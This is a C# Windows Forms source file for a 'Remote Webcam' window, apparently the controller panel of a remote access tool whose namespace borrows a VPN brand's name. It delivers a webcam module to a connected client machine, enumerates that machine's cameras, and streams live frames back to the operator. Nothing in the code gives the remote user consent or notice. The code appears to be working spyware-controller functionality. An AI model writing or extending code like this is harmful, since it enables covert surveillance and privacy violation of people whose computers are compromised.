using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using mullvad.Modules;
using mullvad.Network;
using mullvad.Theme;

namespace mullvad.Forms
{
    internal sealed class RemoteWebcamForm : Form
    {
        private const string ModuleFile = "mullvad.Module.RemoteWebcam";
        private const string ModuleId   = "mullvad.remotewebcam";

        private readonly ClientHandler _handler;
        private ModuleContext?         _ctx;

        private static readonly Dictionary<ClientHandler, RemoteWebcamForm> _openForms = new();

        public static RemoteWebcamForm CreateOrActivate(ClientHandler handler)
        {
            if (_openForms.TryGetValue(handler, out var existing) && !existing.IsDisposed)
            {
                existing.BringToFront();
                return existing;
            }
            var frm = new RemoteWebcamForm(handler);
            frm.FormClosed += (_, _) => _openForms.Remove(handler);
            _openForms[handler] = frm;
            return frm;
        }

        // ── UI controls ───────────────────────────────────────────────────────
        private ComboBox        _cmbCamera   = null!, _cmbRes = null!, _cmbFps = null!, _cmbResize = null!;
        private TrackBar        _trkQuality  = null!;
        private Label           _lblQualVal  = null!;
        private Button          _btnStart    = null!, _btnStop = null!;
        private DisplayPanel    _displayPanel = null!;
        private ToolStripStatusLabel _lblStatus = null!, _lblFps = null!, _lblSize = null!, _lblRes = null!;

        // ── Stream state ──────────────────────────────────────────────────────
        private volatile bool          _streaming;
        private CancellationTokenSource _cts = new CancellationTokenSource();
        private Image?                  _currentFrame;
        private readonly object         _frameLock = new object();

        // ── Stats ─────────────────────────────────────────────────────────────
        private int    _requestedFps;
        private int    _fpsCount;
        private long   _lastFpsMs;
        private double _currentFps;
        private int    _remoteW, _remoteH, _remoteFps;

        private static readonly string[] _resolutions =
            { "640x480", "1280x720", "1920x1080", "320x240", "800x600" };
        private static readonly string[] _fpsList = { "30", "24", "15", "10", "5" };
        private static readonly string[] _resizeModes = { "Fit", "Stretched", "Original" };

        private RemoteWebcamForm(ClientHandler handler)
        {
            _handler = handler;
            Build();
        }

        private void Build()
        {
            SuspendLayout();

            Text          = "Remote Webcam  —  " + _handler.Info.Computer;
            ClientSize    = new Size(720, 580);
            MinimumSize   = new Size(480, 400);
            Font          = new Font("Segoe UI", 9F);
            StartPosition = FormStartPosition.CenterParent;
            ShowInTaskbar = true;

            var iconBmp = IconLoader.Load("webcam.ico") as Bitmap;
            if (iconBmp is not null) try { Icon = Icon.FromHandle(iconBmp.GetHicon()); } catch { }

            // ── Status strip ──────────────────────────────────────────────────
            var strip = new StatusStrip { SizingGrip = false };
            _lblStatus = new ToolStripStatusLabel("Status: Ready")    { Spring = false, BorderSides = ToolStripStatusLabelBorderSides.Right };
            _lblFps    = new ToolStripStatusLabel("FPS: --")          { Spring = false, BorderSides = ToolStripStatusLabelBorderSides.Right };
            _lblSize   = new ToolStripStatusLabel("Size: --")         { Spring = false, BorderSides = ToolStripStatusLabelBorderSides.Right };
            _lblRes    = new ToolStripStatusLabel("Cam: --")          { Spring = true };
            strip.Items.AddRange(new ToolStripItem[] { _lblStatus, _lblFps, _lblSize, _lblRes });

            // ── Bottom control panel ──────────────────────────────────────────
            var bottomPanel = new Panel { Dock = DockStyle.Bottom, Height = 72, Padding = new Padding(4) };

            // Camera group
            var grpCam = new GroupBox { Text = "Camera", Left = 4, Top = 4, Width = 200, Height = 60, Font = new Font("Segoe UI", 8F) };
            _cmbCamera = new ComboBox { Left = 8, Top = 14, Width = 184, DropDownStyle = ComboBoxStyle.DropDownList, FlatStyle = FlatStyle.Flat };
            grpCam.Controls.Add(_cmbCamera);

            // Settings group
            var grpSettings = new GroupBox { Text = "Settings", Left = 210, Top = 4, Width = 360, Height = 60, Font = new Font("Segoe UI", 8F) };
            var lblRes = new Label { Text = "Res:", Left = 6, Top = 18, AutoSize = true };
            _cmbRes = new ComboBox { Left = 30, Top = 14, Width = 80, DropDownStyle = ComboBoxStyle.DropDownList, FlatStyle = FlatStyle.Flat };
            _cmbRes.Items.AddRange(_resolutions);
            _cmbRes.SelectedIndex = 0;

            var lblFps = new Label { Text = "FPS:", Left = 116, Top = 18, AutoSize = true };
            _cmbFps = new ComboBox { Left = 140, Top = 14, Width = 46, DropDownStyle = ComboBoxStyle.DropDownList, FlatStyle = FlatStyle.Flat };
            _cmbFps.Items.AddRange(_fpsList);
            _cmbFps.SelectedIndex = 0;

            var lblQ = new Label { Text = "Quality:", Left = 192, Top = 18, AutoSize = true };
            _trkQuality = new TrackBar { Left = 242, Top = 8, Width = 80, Height = 28, Minimum = 10, Maximum = 100, Value = 75, TickStyle = TickStyle.None };
            _lblQualVal = new Label { Text = "75", Left = 326, Top = 18, Width = 24, AutoSize = false };
            _trkQuality.ValueChanged += (_, _) => _lblQualVal.Text = _trkQuality.Value.ToString();

            var lblMode = new Label { Text = "Mode:", Left = 6, Top = 40, AutoSize = true };
            _cmbResize = new ComboBox { Left = 40, Top = 37, Width = 70, DropDownStyle = ComboBoxStyle.DropDownList, FlatStyle = FlatStyle.Flat };
            _cmbResize.Items.AddRange(_resizeModes);
            _cmbResize.SelectedIndex = 1;

            grpSettings.Controls.AddRange(new Control[] { lblRes, _cmbRes, lblFps, _cmbFps, lblQ, _trkQuality, _lblQualVal, lblMode, _cmbResize });

            // Start / Stop buttons
            _btnStart = new Button { Text = "Start", Left = 578, Top = 16, Width = 60, Height = 26, FlatStyle = FlatStyle.Flat };
            _btnStop  = new Button { Text = "Stop",  Left = 642, Top = 16, Width = 60, Height = 26, FlatStyle = FlatStyle.Flat, Enabled = false };

            _btnStart.Click += BtnStart_Click;
            _btnStop.Click  += BtnStop_Click;

            bottomPanel.Controls.AddRange(new Control[] { grpCam, grpSettings, _btnStart, _btnStop });

            // ── Display panel ─────────────────────────────────────────────────
            _displayPanel = new DisplayPanel { Dock = DockStyle.Fill, BackColor = Color.Black };
            _displayPanel.Paint += DisplayPanel_Paint;

            Controls.Add(_displayPanel);
            Controls.Add(bottomPanel);
            Controls.Add(strip);

            Load       += OnLoad;
            FormClosed += OnFormClosed;

            ResumeLayout(false);
        }

        // ── Load ──────────────────────────────────────────────────────────────
        private async void OnLoad(object? sender, EventArgs e)
        {
            _btnStart.Enabled = false;
            _lblStatus.Text   = "Status: Delivering module…";
            _handler.Disconnected += OnClientDisconnected;

            var bytes = ModuleLoader.GetModuleBytes(ModuleFile);
            if (bytes == null) { _lblStatus.Text = "Status: Module file not found."; return; }

            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(60));
            bool ok = await ModuleDelivery.EnsureDeliveredAsync(_handler, ModuleFile, bytes,
                new Progress<string>(m => _lblStatus.Text = "Status: " + m), cts.Token);

            if (!ok) { _lblStatus.Text = "Status: Module delivery failed."; return; }

            _ctx = new ModuleContext(_handler, ModuleId);
            _ctx.Disconnected += (_, _) => BeginInvoke(() => OnClientDisconnected(_handler));

            try
            {
                using var cts2 = new CancellationTokenSource(TimeSpan.FromSeconds(10));
                var resp = await _ctx.ExecuteAsync("devices", "", cts2.Token);
                PopulateDevices(resp);
            }
            catch { _cmbCamera.Items.Add(new CameraItem(0, "Default Camera")); _cmbCamera.SelectedIndex = 0; }

            _btnStart.Enabled = true;
            _lblStatus.Text   = "Status: Ready";

            _lastFpsMs = Stopwatch.GetTimestamp();
        }

        private void OnFormClosed(object? sender, FormClosedEventArgs e)
        {
            _handler.Disconnected -= OnClientDisconnected;
            StopStream();
            _cts.Dispose();
            _ctx?.Dispose();
            lock (_frameLock) { _currentFrame?.Dispose(); _currentFrame = null; }
        }

        private void OnClientDisconnected(ClientHandler _)
        {
            if (IsDisposed) return;
            BeginInvoke(() =>
            {
                StopStream();
                _btnStart.Enabled = false;
                _lblStatus.Text   = "Status: Disconnected.";
            });
        }

        private void PopulateDevices(string json)
        {
            _cmbCamera.Items.Clear();
            int idx = json.IndexOf("[");
            if (idx < 0) { AddDefaultCamera(); return; }
            int end = json.LastIndexOf("]");
            if (end < idx) { AddDefaultCamera(); return; }

            int i = idx + 1;
            while (i < end)
            {
                while (i < end && json[i] != '{') i++;
                if (i >= end) break;
                int start = i++;
                int depth = 1;
                while (i < end && depth > 0) { if (json[i]=='{') depth++; else if(json[i]=='}') depth--; i++; }
                var obj  = json.Substring(start, i - start);
                int id   = ParseInt(obj, "id",   -1);
                var name = GetStr(obj, "name") ?? "Camera " + id;
                _cmbCamera.Items.Add(new CameraItem(id, name));
            }
            if (_cmbCamera.Items.Count == 0) AddDefaultCamera();
            _cmbCamera.SelectedIndex = 0;
        }

        private void AddDefaultCamera() { _cmbCamera.Items.Add(new CameraItem(0, "Default Camera")); _cmbCamera.SelectedIndex = 0; }

        // ── Start / Stop ──────────────────────────────────────────────────────

        private async void BtnStart_Click(object? sender, EventArgs e)
        {
            if (_streaming || _ctx == null) return;
            _btnStart.Enabled = false;
            _btnStop.Enabled  = true;
            _streaming        = true;

            int device  = _cmbCamera.SelectedItem is CameraItem ci ? ci.Id : 0;
            var resParts= (_cmbRes.SelectedItem?.ToString() ?? "640x480").Split('x');
            int w       = resParts.Length == 2 && int.TryParse(resParts[0], out int rw) ? rw : 640;
            int h       = resParts.Length == 2 && int.TryParse(resParts[1], out int rh) ? rh : 480;
            int fps     = int.TryParse(_cmbFps.SelectedItem?.ToString(), out int f) ? f : 30;
            int quality = _trkQuality.Value;
            _requestedFps = fps;

            try
            {
                _cts?.Dispose();
                _cts = new CancellationTokenSource();

                var startPayload = $"{{\"device\":{device},\"width\":{w},\"height\":{h},\"fps\":{fps},\"quality\":{quality}}}";
                using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(10));
                var startResp = await _ctx.ExecuteAsync("start_stream", startPayload, cts.Token);
                var errMsg = GetStr(startResp ?? "", "error");
                if (errMsg != null) { StopStream(); _lblStatus.Text = "Status: Camera error — " + errMsg; return; }

                _lblStatus.Text = "Status: Streaming…";
                _lastFpsMs = Stopwatch.GetTimestamp();

                _ = StreamLoopAsync(_cts.Token);
            }
            catch (Exception ex)
            {
                StopStream();
                _lblStatus.Text = "Status: Failed — " + ex.Message;
            }
        }

        private void BtnStop_Click(object? sender, EventArgs e) => StopStream();

        private void StopStream()
        {
            if (!_streaming) return;
            _streaming = false;
            _cts?.Cancel();
            if (_ctx != null)
                _ = Task.Run(async () =>
                {
                    try { using var cts = new CancellationTokenSource(3000); await _ctx.ExecuteAsync("stop_stream", "", cts.Token); } catch { }
                });
            if (!IsDisposed) BeginInvoke(() =>
            {
                _btnStart.Enabled = true;
                _btnStop.Enabled  = false;
                _lblStatus.Text   = "Status: Stopped.";
            });
        }

        // ── Stream loop ───────────────────────────────────────────────────────

        private async Task StreamLoopAsync(CancellationToken ct)
        {
            // Request frames at roughly the negotiated rate, and give up after
            // several consecutive failures instead of hammering the client.
            int consecutiveFails = 0;

            while (!ct.IsCancellationRequested && _streaming && _ctx != null)
            {
                try
                {
                    using var cts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                    cts.CancelAfter(5000);
                    var resp = await _ctx.ExecuteAsync("get_frame", "", cts.Token);

                    if (resp?.Contains("\"ok\":true") == true)
                    {
                        consecutiveFails = 0;
                        RenderFrame(resp);
                    }
                    else
                    {
                        // Dead stream (no camera / stopped)? Bail out after a few tries.
                        if (++consecutiveFails >= 15)
                        {
                            BeginInvoke(() =>
                            {
                                _lblStatus.Text = "Status: Camera not sending frames.";
                            });
                            break;
                        }
                        await Task.Delay(500, ct);
                        continue;
                    }
                }
                catch (OperationCanceledException) { break; }
                catch (Exception)
                {
                    if (++consecutiveFails >= 5) break;
                    try { await Task.Delay(300, ct); } catch { break; }
                    continue;
                }

                int effectiveFps = Math.Max(_remoteFps > 0 ? _remoteFps : _requestedFps, 1);
                int frameDelayMs = Math.Max(1000 / effectiveFps, 33);
                try { await Task.Delay(frameDelayMs, ct); } catch { break; }
            }

            if (!IsDisposed) BeginInvoke(() => { if (_streaming) StopStream(); });
        }

        private void RenderFrame(string json)
        {
            int di = json.IndexOf("\"data\":\"");
            if (di < 0) return;
            int s = di + 8, e = json.IndexOf('"', s);
            if (e <= s) return;

            byte[] packet;
            try { packet = Convert.FromBase64String(json.Substring(s, e - s)); }
            catch { return; }

            if (packet.Length < 13) return;

            _remoteW   = BitConverter.ToInt32(packet, 1);
            _remoteH   = BitConverter.ToInt32(packet, 5);
            _remoteFps = BitConverter.ToInt32(packet, 9);

            byte[] jpegData = new byte[packet.Length - 13];
            Buffer.BlockCopy(packet, 13, jpegData, 0, jpegData.Length);

            Image? frame;
            try { frame = Image.FromStream(new MemoryStream(jpegData), false, false); }
            catch { return; }

            Image? old;
            lock (_frameLock) { old = _currentFrame; _currentFrame = frame; }
            old?.Dispose();

            UpdateFps();

            if (!IsDisposed) BeginInvoke(() =>
            {
                _displayPanel.Invalidate();
                _lblFps.Text  = $"FPS: {_currentFps:F1} (cam {_remoteFps})";
                _lblSize.Text = $"Size: {jpegData.Length / 1024.0:F1} KB";
                _lblRes.Text  = $"Cam: {_remoteW}×{_remoteH}";
            });
        }

        private void UpdateFps()
        {
            _fpsCount++;
            long now     = Stopwatch.GetTimestamp();
            long elapsed = now - _lastFpsMs;
            if (elapsed >= Stopwatch.Frequency)
            {
                _currentFps = _fpsCount * Stopwatch.Frequency / (double)elapsed;
                _fpsCount   = 0;
                _lastFpsMs  = now;
            }
        }

        // ── Paint ─────────────────────────────────────────────────────────────
        private void DisplayPanel_Paint(object? sender, PaintEventArgs e)
        {
            Image? frame;
            lock (_frameLock) { frame = _currentFrame; }
            if (frame == null) return;

            var g    = e.Graphics;
            var size = _displayPanel.ClientSize;

            switch (_cmbResize.SelectedItem?.ToString() ?? "Fit")
            {
                case "Stretched":
                    g.DrawImage(frame, 0, 0, size.Width, size.Height);
                    break;
                case "Original":
                    g.DrawImage(frame, 0, 0, frame.Width, frame.Height);
                    break;
                default:
                {
                    float scaleX = (float)size.Width  / frame.Width;
                    float scaleY = (float)size.Height / frame.Height;
                    float scale  = Math.Min(scaleX, scaleY);
                    int   fw     = (int)(frame.Width  * scale);
                    int   fh     = (int)(frame.Height * scale);
                    int   ox     = (size.Width  - fw) / 2;
                    int   oy     = (size.Height - fh) / 2;
                    g.DrawImage(frame, ox, oy, fw, fh);
                    break;
                }
            }
        }

        // ── Inner classes ─────────────────────────────────────────────────────

        private class DisplayPanel : Panel
        {
            public DisplayPanel() { DoubleBuffered = true; }
        }

        private class CameraItem
        {
            public int Id { get; }
            private readonly string _name;
            public CameraItem(int id, string name) { Id = id; _name = name; }
            public override string ToString() => _name;
        }

        // ── Helpers ───────────────────────────────────────────────────────────

        private static int ParseInt(string json, string key, int def)
        {
            if (string.IsNullOrEmpty(json)) return def;
            var k = "\"" + key + "\""; int idx = json.IndexOf(k); if (idx < 0) return def;
            int c = json.IndexOf(':', idx + k.Length); if (c < 0) return def;
            int ss = c + 1; while (ss < json.Length && json[ss] == ' ') ss++;
            bool neg = ss < json.Length && json[ss] == '-'; if (neg) ss++;
            int e = ss; while (e < json.Length && char.IsDigit(json[e])) e++;
            return e == ss ? def : int.TryParse(json.Substring(ss, e - ss), out int v) ? (neg ? -v : v) : def;
        }

        private static string? GetStr(string json, string key)
        {
            if (string.IsNullOrEmpty(json)) return null;
            var k = "\"" + key + "\""; int idx = json.IndexOf(k); if (idx < 0) return null;
            int c = json.IndexOf(':', idx + k.Length); if (c < 0) return null;
            int s = c + 1; while (s < json.Length && json[s] == ' ') s++;
            if (s >= json.Length || json[s] != '"') return null; s++;
            var sb = new StringBuilder();
            for (int i = s; i < json.Length; i++)
            {
                if (json[i] == '\\' && i + 1 < json.Length) { switch (json[++i]) { case '"': sb.Append('"'); break; case '\\': sb.Append('\\'); break; default: sb.Append(json[i]); break; } }
                else if (json[i] == '"') break;
                else sb.Append(json[i]);
            }
            return sb.ToString();
        }
    }
}
